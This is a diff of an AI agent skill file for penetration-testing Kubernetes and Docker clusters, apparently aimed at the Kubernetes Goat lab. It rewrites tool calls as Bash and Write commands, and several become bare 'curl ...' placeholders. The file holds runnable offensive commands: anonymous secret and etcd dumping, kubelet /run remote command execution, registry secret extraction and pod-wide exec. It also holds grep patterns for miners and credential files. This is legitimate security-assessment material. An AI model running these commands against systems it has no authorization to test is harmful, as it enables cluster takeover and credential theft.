@@ -22,33 +22,29 @@ This skill covers all 22 Kubernetes Goat attack scenarios and the full OWASP Kub
 
 Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.
 
-| Trigger | Chain | Mandatory? | Claude Code | opencode |
-|---------|-------|-----------|-------------|---------|
-| After `session(action="complete")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
-| Container escape achieved | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
-| Default credentials found on services | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` | `cat ~/.config/opencode/commands/credential-audit.md` |
-| Architecture review needed | `/threat-modeling` | OPTIONAL | `Skill(skill="threat-modeling")` | `cat ~/.config/opencode/commands/threat-modeling.md` |
+| Trigger | Chain | Mandatory? | Claude Code |
+|------|------|------|------|
+| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
+| Container escape achieved | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
+| Default credentials found on services | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` |
+| Architecture review needed | `/threat-modeling` | OPTIONAL | `Skill(skill="threat-modeling")` |
 
-**You WILL invoke `/gh-export` after `session(action="complete")`. This is not optional.**
+**You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`. This is not optional.**
 
 ## Tools Available
 
 | Tool | Use for |
 |------|---------|
-| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
-| `session(action="complete", options={...})` | Mark the scan done and write final notes |
-| `scan(tool="nuclei", ...)` | Kubernetes/Docker vulnerability templates |
-| `scan(tool="nmap", ...)` | Service discovery (API servers, etcd, kubelet, NodePorts) |
-| `kali(command=...)` | Kali tools: trivy, kubectl, curl, kube-bench, docker |
-| `http(action="request", ...)` | Direct API probing — K8s API server, etcd, kubelet, Docker API, registries |
-| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
-| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
-| `report(action="diagram", data={...})` | Save a Mermaid diagram (K8s topology, attack paths) to findings.json |
-| `report(action="dashboard", data={"port": 5000})` | Serve dashboard.html at localhost:5000 |
-| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |
+| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
+| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
+| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
+| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
+| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
+| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 
-**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
 
 ---
 
@@ -100,9 +96,9 @@ Read this before executing any workflow phase. Commit to MANDATORY chains before
 
 ### Phase 0 — Scope & Setup
 
-0. Call `session(action="start", options={...})` with target, depth, and limits
-1. Call `report(action="dashboard", data={"port": 5000})` — live findings tracker
-2. Call `report(action="note", data={...})` — record: target type (Docker/K8s/both), perspective (external/internal/both), access level (anonymous/token/kubeconfig), cluster type (kind/EKS/GKE/AKS/vanilla)
+0. Call `Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` with target, depth, and limits
+1. Call `# (no dashboard — see pentest/findings.json directly)` — live findings tracker
+2. Call `Bash("echo '<message>' >> pentest/notes.log")` — record: target type (Docker/K8s/both), perspective (external/internal/both), access level (anonymous/token/kubeconfig), cluster type (kind/EKS/GKE/AKS/vanilla)
 
 ---
 
@@ -110,7 +106,7 @@ Read this before executing any workflow phase. Commit to MANDATORY chains before
 
 **K8s infrastructure port scan:**
 ```
-scan(tool="nmap", target=HOST, options={"ports": "443,2375,2376,2379,2380,4194,5000,6443,8001,8080,8443,8888,9090,10250,10255,10256,30000-32767"})
+Bash("nmap ...")
 ```
 
 Port reference:
@@ -132,17 +128,17 @@ Port reference:
 
 **Scan NodePort range for exposed services:**
 ```
-scan(tool="nmap", target=HOST, options={"ports": "30000-32767", "flags": "-sV"})
+Bash("nmap ...")
 ```
 
 **Enumerate NodePort services via API (if authenticated):**
 ```
-kali(command="kubectl get svc --all-namespaces -o json 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(f\"{s[\"metadata\"][\"namespace\"]}/{s[\"metadata\"][\"name\"]}: type={s[\"spec\"][\"type\"]} ports={[(p.get(\"nodePort\",\"N/A\"),p[\"port\"],p[\"targetPort\"]) for p in s[\"spec\"].get(\"ports\",[])]}\" ) for s in d.get(\"items\",[]) if s[\"spec\"].get(\"type\") == \"NodePort\"]'")
+Bash("kubectl get svc --all-namespaces -o json 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(f\"{s[\"metadata\"][\"namespace\"]}/{s[\"metadata\"][\"name\"]}: type={s[\"spec\"][\"type\"]} ports={[(p.get(\"nodePort\",\"N/A\"),p[\"port\"],p[\"targetPort\"]) for p in s[\"spec\"].get(\"ports\",[])]}\" ) for s in d.get(\"items\",[]) if s[\"spec\"].get(\"type\") == \"NodePort\"]'")
 ```
 
 **For each discovered NodePort, probe the service:**
 ```
-http(action="request", url="http://TARGET:NODEPORT/", method="GET")
+Bash("curl ...")
 ```
 
 Any NodePort service is a finding — report each one with the service name, namespace, and what it exposes. NodePort services bypass ingress controls and are accessible on every node IP.
@@ -153,51 +149,51 @@ Any NodePort service is a finding — report each one with the service name, nam
 
 **API server version leak + anonymous auth:**
 ```
-http(action="request", url="https://TARGET:6443/version", method="GET")
-http(action="request", url="https://TARGET:6443/api", method="GET")
-http(action="request", url="https://TARGET:6443/api/v1/namespaces", method="GET")
+Bash("curl ...")
+Bash("curl ...")
+Bash("curl ...")
 ```
 
 **Anonymous pod and secret enumeration:**
 ```
-kali(command="curl -sk https://TARGET:6443/api/v1/pods 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(f\"{p[\"metadata\"][\"namespace\"]}/{p[\"metadata\"][\"name\"]}: {[c[\"image\"] for c in p[\"spec\"][\"containers\"]]}\") for p in d.get(\"items\",[])]' 2>/dev/null | head -30")
-kali(command="curl -sk https://TARGET:6443/api/v1/secrets 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print(f\"Secrets accessible: {len(d.get(\"items\",[]))}\"); [print(f\"  {s[\"metadata\"][\"namespace\"]}/{s[\"metadata\"][\"name\"]}: keys={list(s.get(\"data\",{}).keys())}\") for s in d.get(\"items\",[])[:20]]' 2>/dev/null")
+Bash("curl -sk https://TARGET:6443/api/v1/pods 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); [print(f\"{p[\"metadata\"][\"namespace\"]}/{p[\"metadata\"][\"name\"]}: {[c[\"image\"] for c in p[\"spec\"][\"containers\"]]}\") for p in d.get(\"items\",[])]' 2>/dev/null | head -30")
+Bash("curl -sk https://TARGET:6443/api/v1/secrets 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print(f\"Secrets accessible: {len(d.get(\"items\",[]))}\"); [print(f\"  {s[\"metadata\"][\"namespace\"]}/{s[\"metadata\"][\"name\"]}: keys={list(s.get(\"data\",{}).keys())}\") for s in d.get(\"items\",[])[:20]]' 2>/dev/null")
 ```
 
 **etcd direct access (unauthenticated):**
 ```
-kali(command="curl -sk https://TARGET:2379/version 2>/dev/null")
-kali(command="curl -sk https://TARGET:2379/v2/keys/ 2>/dev/null | head -50")
-kali(command="curl -sk https://TARGET:2379/v3/kv/range -X POST -H 'Content-Type: application/json' -d '{\"key\": \"L3JlZ2lzdHJ5\"}' 2>/dev/null | head -100")
+Bash("curl -sk https://TARGET:2379/version 2>/dev/null")
+Bash("curl -sk https://TARGET:2379/v2/keys/ 2>/dev/null | head -50")
+Bash("curl -sk https://TARGET:2379/v3/kv/range -X POST -H 'Content-Type: application/json' -d '{\"key\": \"L3JlZ2lzdHJ5\"}' 2>/dev/null | head -100")
 ```
 
 **Docker daemon exposure:**
 ```
-http(action="request", url="http://TARGET:2375/version", method="GET")
-http(action="request", url="http://TARGET:2375/containers/json", method="GET")
-http(action="request", url="http://TARGET:2375/images/json", method="GET")
+Bash("curl ...")
+Bash("curl ...")
+Bash("curl ...")
 ```
 
 **Kubelet API — unauthenticated pod listing:**
 ```
-http(action="request", url="https://TARGET:10250/pods", method="GET")
-http(action="request", url="http://TARGET:10255/pods", method="GET")
+Bash("curl ...")
+Bash("curl ...")
 ```
 
 **Kubelet RCE via /run endpoint (anonymous auth):**
 If kubelet returns pods at /pods, test command execution:
 ```
-kali(command="curl -sk https://TARGET:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME -X POST -d 'cmd=id' 2>/dev/null")
+Bash("curl -sk https://TARGET:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME -X POST -d 'cmd=id' 2>/dev/null")
 ```
 This is a **Critical** finding — unauthenticated RCE on any container via the kubelet API.
 
 **kubectl proxy / insecure port:**
 ```
-http(action="request", url="http://TARGET:8001/api/v1/namespaces", method="GET")
-http(action="request", url="http://TARGET:8080/api/v1/namespaces", method="GET")
+Bash("curl ...")
+Bash("curl ...")
 ```
 
-Call `report(action="diagram", data={...})` with discovered K8s topology after this phase.
+Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with discovered K8s topology after this phase.
 
 ---
 
@@ -205,7 +201,7 @@ Call `report(action="diagram", data={...})` with discovered K8s topology after t
 
 **Comprehensive pod security audit — check ALL dangerous configurations:**
 ```
-kali(command="kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for p in d.get(\"items\", []):
@@ -267,7 +263,7 @@ Test from inside containers (via exec or compromised pod perspective).
 
 **5a. Container runtime socket discovery:**
 ```
-kali(command="kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 sockets = [\"/var/run/docker.sock\", \"/run/containerd/containerd.sock\", \"/run/crio/crio.sock\", \"/var/run/cri-dockerd.sock\"]
@@ -353,7 +349,7 @@ cat /etc/resolv.conf
 
 **6a. Overly permissive ClusterRoleBindings:**
 ```
-kali(command="kubectl get clusterrolebindings -o json 2>/dev/null | python3 -c '
+Bash("kubectl get clusterrolebindings -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for b in d.get(\"items\", []):
@@ -372,7 +368,7 @@ for b in d.get(\"items\", []):
 
 **6b. Wildcard and overly broad Roles/ClusterRoles:**
 ```
-kali(command="kubectl get clusterroles -o json 2>/dev/null | python3 -c '
+Bash("kubectl get clusterroles -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for r in d.get(\"items\", []):
@@ -396,7 +392,7 @@ for r in d.get(\"items\", []):
 
 **6c. Default ServiceAccount token auto-mount:**
 ```
-kali(command="kubectl get serviceaccounts --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get serviceaccounts --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for sa in d.get(\"items\", []):
@@ -443,7 +439,7 @@ kubectl auth can-i create clusterrolebindings 2>/dev/null
 
 **7a. Enumerate all K8s secrets:**
 ```
-kali(command="kubectl get secrets --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get secrets --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys, base64
 d = json.load(sys.stdin)
 for s in d.get(\"items\", []):
@@ -466,7 +462,7 @@ for s in d.get(\"items\", []):
 
 **7b. Check for secrets injected as environment variables (worse than volume mounts):**
 ```
-kali(command="kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for p in d.get(\"items\", []):
@@ -513,7 +509,7 @@ cat /etc/hosts
 
 **7d. .git exposure in running containers:**
 ```
-kali(command="kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[0].name}{\"\\n\"}{end}' 2>/dev/null | head -20 | while read ns pod ctr; do echo \"Checking $ns/$pod...\"; kubectl exec -n \"$ns\" \"$pod\" -c \"$ctr\" -- ls -la /.git 2>/dev/null && echo \"CRITICAL: .git found in $ns/$pod\"; done")
+Bash("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[0].name}{\"\\n\"}{end}' 2>/dev/null | head -20 | while read ns pod ctr; do echo \"Checking $ns/$pod...\"; kubectl exec -n \"$ns\" \"$pod\" -c \"$ctr\" -- ls -la /.git 2>/dev/null && echo \"CRITICAL: .git found in $ns/$pod\"; done")
 ```
 
 If .git is found in a container, secrets may be in git history:
@@ -524,7 +520,7 @@ kubectl exec -n NAMESPACE POD -- git -C / log --all -p -S 'password' 2>/dev/null
 
 **7e. Check etcd encryption at rest:**
 ```
-kali(command="kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep -i encrypt")
+Bash("kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep -i encrypt")
 ```
 If `--encryption-provider-config` is absent, secrets are stored in plaintext in etcd.
 
@@ -534,13 +530,13 @@ If `--encryption-provider-config` is absent, secrets are stored in plaintext in 
 
 **8a. List all container images in the cluster:**
 ```
-kali(command="kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.containers[*]}{.image}{\" \"}{end}{\"\\n\"}{end}' 2>/dev/null | sort -u")
+Bash("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {range .spec.containers[*]}{.image}{\" \"}{end}{\"\\n\"}{end}' 2>/dev/null | sort -u")
 ```
 
 **8b. Image vulnerability scanning with Trivy:**
 For each unique image (use `--image-src remote` to pull from registry, or omit for local Docker):
 ```
-kali(command="sh -c 'trivy image --severity CRITICAL,HIGH --no-progress --image-src remote IMAGE:TAG > /tmp/trivy-output.txt 2>&1; cat /tmp/trivy-output.txt'")
+Bash("sh -c 'trivy image --severity CRITICAL,HIGH --no-progress --image-src remote IMAGE:TAG > /tmp/trivy-output.txt 2>&1; cat /tmp/trivy-output.txt'")
 ```
 
 Flag images that:
@@ -555,7 +551,7 @@ Approach depends on the container runtime. Detect first, then use the appropriat
 
 **Docker runtime (docker.sock available):**
 ```
-kali(command="sh -c 'docker history --no-trunc IMAGE:TAG > /tmp/history.txt 2>&1; cat /tmp/history.txt'")
+Bash("sh -c 'docker history --no-trunc IMAGE:TAG > /tmp/history.txt 2>&1; cat /tmp/history.txt'")
 ```
 
 **containerd/CRI runtime (kind, EKS, GKE, most modern clusters):**
@@ -588,8 +584,8 @@ Look for patterns in history/config output:
 
 For Docker-runtime clusters, extract and inspect individual layers:
 ```
-kali(command="sh -c 'docker save IMAGE:TAG -o /tmp/image.tar && tar -tf /tmp/image.tar'")
-kali(command="sh -c 'cd /tmp && tar -xf image.tar && for layer in */layer.tar; do echo \"=== $layer ===\"; tar -tf \"$layer\" | grep -iE \"secret|password|key|token|credential|.env|.git|id_rsa|.pem\" 2>/dev/null; done'")
+Bash("sh -c 'docker save IMAGE:TAG -o /tmp/image.tar && tar -tf /tmp/image.tar'")
+Bash("sh -c 'cd /tmp && tar -xf image.tar && for layer in */layer.tar; do echo \"=== $layer ===\"; tar -tf \"$layer\" | grep -iE \"secret|password|key|token|credential|.env|.git|id_rsa|.pem\" 2>/dev/null; done'")
 ```
 
 **8d. Dive analysis:**
@@ -597,13 +593,13 @@ kali(command="sh -c 'cd /tmp && tar -xf image.tar && for layer in */layer.tar; d
 dive needs a Docker daemon or an archive file. Choose the right source:
 ```
 # Docker runtime — pull directly
-kali(command="sh -c 'dive IMAGE:TAG --ci > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
+Bash("sh -c 'dive IMAGE:TAG --ci > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
 
 # containerd/CRI runtime — use exported archive from 8c
-kali(command="sh -c 'dive --source docker-archive /tmp/image.tar --ci > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
+Bash("sh -c 'dive --source docker-archive /tmp/image.tar --ci > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
 
 # Remote registry — pull from registry (works without Docker)
-kali(command="sh -c 'dive IMAGE:TAG --ci --source remote > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
+Bash("sh -c 'dive IMAGE:TAG --ci --source remote > /tmp/dive.txt 2>&1; cat /tmp/dive.txt'")
 ```
 
 **Note:** For images only available inside cluster nodes (not on public registries), you must export via `crictl` first (see 8c), then use `--source docker-archive`.
@@ -611,32 +607,32 @@ kali(command="sh -c 'dive IMAGE:TAG --ci --source remote > /tmp/dive.txt 2>&1; c
 **8e. Crypto miner detection in images:**
 Look for crypto mining indicators in image layers and running processes:
 ```
-kali(command="sh -c 'docker history --no-trunc IMAGE:TAG 2>/dev/null | grep -iE \"xmrig|minergate|coinhive|cryptonight|stratum|pool\\.|monero|bitcoin|ethereum|curl.*mining|wget.*miner|system-startup\"'")
+Bash("sh -c 'docker history --no-trunc IMAGE:TAG 2>/dev/null | grep -iE \"xmrig|minergate|coinhive|cryptonight|stratum|pool\\.|monero|bitcoin|ethereum|curl.*mining|wget.*miner|system-startup\"'")
 ```
 
 From inside running containers, check for suspicious processes:
 ```
-kali(command="kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[0].name}{\"\\n\"}{end}' 2>/dev/null | head -20 | while read ns pod ctr; do echo \"=== $ns/$pod ===\"; kubectl exec -n \"$ns\" \"$pod\" -c \"$ctr\" -- ps aux 2>/dev/null | grep -ivE 'grep|ps' | head -10; done")
+Bash("kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace} {.metadata.name} {.spec.containers[0].name}{\"\\n\"}{end}' 2>/dev/null | head -20 | while read ns pod ctr; do echo \"=== $ns/$pod ===\"; kubectl exec -n \"$ns\" \"$pod\" -c \"$ctr\" -- ps aux 2>/dev/null | grep -ivE 'grep|ps' | head -10; done")
 ```
 
 **8f. Private container registry enumeration:**
 Scan for exposed registries on port 5000 or discovered via service enumeration:
 ```
-http(action="request", url="http://TARGET:5000/v2/", method="GET")
-http(action="request", url="http://TARGET:5000/v2/_catalog", method="GET")
+Bash("curl ...")
+Bash("curl ...")
 ```
 
 If the registry is accessible, enumerate repositories and extract image configs:
 ```
-kali(command="curl -s http://REGISTRY:5000/v2/_catalog 2>/dev/null")
-kali(command="curl -s http://REGISTRY:5000/v2/REPO_NAME/tags/list 2>/dev/null")
-kali(command="curl -s http://REGISTRY:5000/v2/REPO_NAME/manifests/TAG 2>/dev/null | head -50")
+Bash("curl -s http://REGISTRY:5000/v2/_catalog 2>/dev/null")
+Bash("curl -s http://REGISTRY:5000/v2/REPO_NAME/tags/list 2>/dev/null")
+Bash("curl -s http://REGISTRY:5000/v2/REPO_NAME/manifests/TAG 2>/dev/null | head -50")
 ```
 
 Look for environment variables with secrets in image manifests:
 ```
-kali(command="curl -s http://REGISTRY:5000/v2/REPO_NAME/manifests/TAG -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); config_digest=d.get(\"config\",{}).get(\"digest\",\"\"); print(f\"Config digest: {config_digest}\")' 2>/dev/null")
-kali(command="curl -s http://REGISTRY:5000/v2/REPO_NAME/blobs/CONFIG_DIGEST 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); env=d.get(\"config\",{}).get(\"Env\",[]); [print(f\"ENV: {e}\") for e in env]' 2>/dev/null")
+Bash("curl -s http://REGISTRY:5000/v2/REPO_NAME/manifests/TAG -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); config_digest=d.get(\"config\",{}).get(\"digest\",\"\"); print(f\"Config digest: {config_digest}\")' 2>/dev/null")
+Bash("curl -s http://REGISTRY:5000/v2/REPO_NAME/blobs/CONFIG_DIGEST 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); env=d.get(\"config\",{}).get(\"Env\",[]); [print(f\"ENV: {e}\") for e in env]' 2>/dev/null")
 ```
 
 ---
@@ -645,15 +641,15 @@ kali(command="curl -s http://REGISTRY:5000/v2/REPO_NAME/blobs/CONFIG_DIGEST 2>/d
 
 **9a. Check for NetworkPolicies:**
 ```
-kali(command="kubectl get networkpolicies --all-namespaces 2>/dev/null")
+Bash("kubectl get networkpolicies --all-namespaces 2>/dev/null")
 ```
 
 No NetworkPolicies = **Medium** finding — all pods can communicate freely across all namespaces.
 
 **9b. List all namespaces and services for cross-namespace probing:**
 ```
-kali(command="kubectl get namespaces 2>/dev/null")
-kali(command="kubectl get svc --all-namespaces 2>/dev/null")
+Bash("kubectl get namespaces 2>/dev/null")
+Bash("kubectl get svc --all-namespaces 2>/dev/null")
 ```
 
 **9c. Cross-namespace connectivity test (from inside a pod):**
@@ -711,7 +707,7 @@ done
 
 kube-bench must run on cluster nodes (needs access to kubelet config, API server manifests, etcd). Deploy as a K8s Job — this is the recommended approach for all cluster types:
 ```
-kali(command="kubectl apply -f - <<'EOF'
+Bash("kubectl apply -f - <<'EOF'
 apiVersion: batch/v1
 kind: Job
 metadata:
@@ -775,7 +771,7 @@ Key CIS checks that map to Kubernetes Goat scenarios:
 
 First detect the container runtime — this determines which benchmark to run:
 ```
-kali(command="kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.containerRuntimeVersion}' 2>/dev/null")
+Bash("kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.containerRuntimeVersion}' 2>/dev/null")
 ```
 
 | Runtime | Benchmark | Notes |
@@ -786,7 +782,7 @@ kali(command="kubectl get nodes -o jsonpath='{.items[0].status.nodeInfo.containe
 
 **Docker runtime only** — deploy docker-bench-security as a DaemonSet:
 ```
-kali(command="kubectl apply -f - <<'EOF'
+Bash("kubectl apply -f - <<'EOF'
 apiVersion: apps/v1
 kind: DaemonSet
 metadata:
@@ -831,7 +827,7 @@ EOF
 
 **10c. API server configuration audit (manual):**
 ```
-kali(command="kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep -E 'anonymous-auth|authorization-mode|enable-admission|encryption-provider|audit-log|allow-privileged|insecure-port|service-account-lookup'")
+Bash("kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep -E 'anonymous-auth|authorization-mode|enable-admission|encryption-provider|audit-log|allow-privileged|insecure-port|service-account-lookup'")
 ```
 
 Check these critical API server flags:
@@ -853,17 +849,17 @@ Check for the presence of security tools and controls. Their ABSENCE is a findin
 
 **11a. Admission controllers:**
 ```
-kali(command="kubectl get pods --all-namespaces 2>/dev/null | grep -iE 'gatekeeper|kyverno|falco|tetragon|kubearmor|neuvector|twistlock|prisma|aqua|stackrox'")
-kali(command="kubectl get validatingwebhookconfigurations 2>/dev/null")
-kali(command="kubectl get mutatingwebhookconfigurations 2>/dev/null")
-kali(command="kubectl api-resources 2>/dev/null | grep -iE 'constraint|policy|kyverno'")
+Bash("kubectl get pods --all-namespaces 2>/dev/null | grep -iE 'gatekeeper|kyverno|falco|tetragon|kubearmor|neuvector|twistlock|prisma|aqua|stackrox'")
+Bash("kubectl get validatingwebhookconfigurations 2>/dev/null")
+Bash("kubectl get mutatingwebhookconfigurations 2>/dev/null")
+Bash("kubectl api-resources 2>/dev/null | grep -iE 'constraint|policy|kyverno'")
 ```
 
 No admission webhooks = **Medium** finding — no policy enforcement beyond built-in controllers.
 
 **11b. Pod Security Standards enforcement:**
 ```
-kali(command="kubectl get namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for ns in d.get(\"items\", []):
@@ -881,30 +877,30 @@ for ns in d.get(\"items\", []):
 
 **11c. Runtime security monitoring:**
 ```
-kali(command="kubectl get pods --all-namespaces 2>/dev/null | grep -iE 'falco|tetragon|sysdig|cilium'")
-kali(command="kubectl get daemonsets --all-namespaces 2>/dev/null | grep -iE 'falco|tetragon|sysdig'")
+Bash("kubectl get pods --all-namespaces 2>/dev/null | grep -iE 'falco|tetragon|sysdig|cilium'")
+Bash("kubectl get daemonsets --all-namespaces 2>/dev/null | grep -iE 'falco|tetragon|sysdig'")
 ```
 
 No runtime security tool = **Medium** finding — no detection of container escape, sensitive file access, or suspicious process execution.
 
 **11d. Audit logging:**
 ```
-kali(command="kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep audit")
+Bash("kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null | tr ',' '\\n' | grep audit")
 ```
 
 No `--audit-log-path` = **High** finding — all API actions are unlogged.
 
 **11e. Resource limits and quotas:**
 ```
-kali(command="kubectl get limitranges --all-namespaces 2>/dev/null")
-kali(command="kubectl get resourcequotas --all-namespaces 2>/dev/null")
+Bash("kubectl get limitranges --all-namespaces 2>/dev/null")
+Bash("kubectl get resourcequotas --all-namespaces 2>/dev/null")
 ```
 
 No LimitRange or ResourceQuota = **Medium** finding — pods can consume unlimited resources (DoS vector).
 
 **11f. Image pull policy and allowed registries:**
 ```
-kali(command="kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
+Bash("kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c '
 import json, sys
 d = json.load(sys.stdin)
 for p in d.get(\"items\", []):
@@ -924,7 +920,7 @@ for p in d.get(\"items\", []):
 
 ### Phase 12 — Attack Path Diagram & Report
 
-1. Call `report(action="diagram", data={...})` with a comprehensive attack path map showing all discovered vectors:
+1. Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with a comprehensive attack path map showing all discovered vectors:
 
 ```mermaid
 flowchart TD
@@ -966,7 +962,7 @@ flowchart TD
     style SECRETS fill:#ff6b6b,color:#fff
 ```
 
-2. Call `report(action="note", data={...})` with assessment summary:
+2. Call `Bash("echo '<message>' >> pentest/notes.log")` with assessment summary:
 ```
 Container/K8s Security Assessment Summary:
   Cluster version:         [version]
@@ -991,7 +987,7 @@ Container/K8s Security Assessment Summary:
   Cloud metadata access:   [accessible/blocked]
 ```
 
-3. Call `session(action="complete", options={...})` with summary
+3. Call `Write("pentest/summary.md", "<summary>")` with summary
 4. **Export GitHub Issues** — invoke the `/gh-export` skill
 
 ---
@@ -1035,15 +1031,15 @@ This table maps each Kubernetes Goat attack scenario to the phase in this skill 
 | `/network-assess` | Internal network beyond K8s (VLAN, ARP, broadcast protocols) |
 | `/ssl-tls-audit` | TLS services on K8s ingress or NodePorts — deep TLS audit |
 | `/threat-modeling` | Produce PASTA threat model of the K8s architecture |
-| `/gh-export` | Always — after `session(action="complete", options={...})` |
+| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |
 
 ---
 
 ## Rules
 
-- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
+- **`Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
 - **Batch independent tools in the same response** — they execute in parallel
-- When any tool returns a LIMIT message, stop immediately and call `session(action="complete", options={...})`
+- When any tool returns a LIMIT message, stop immediately and call `Write("pentest/summary.md", "<summary>")`
 - **Check anonymous auth first** — unauthenticated K8s API and kubelet access are the most critical findings
 - **Enumerate service accounts** — they're the most common K8s attack vector
 - **Always check NodePort range** — these bypass ingress controls entirely
@@ -1051,9 +1047,9 @@ This table maps each Kubernetes Goat attack scenario to the phase in this skill 
 - **Test cross-namespace connectivity** — the flat network model is a lateral movement goldmine
 - **Check for SSRF to metadata** — cloud credentials via 169.254.169.254 from pods
 - **Verify defensive controls** — the ABSENCE of Falco, Kyverno, NetworkPolicies, audit logging is itself a finding
-- **Call `report(action="finding", data={...})` for every confirmed weakness** — include the specific resource, misconfiguration, and impact
+- **Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every confirmed weakness** — include the specific resource, misconfiguration, and impact
 - **Test container escape only when authorized** — these can affect the underlying host
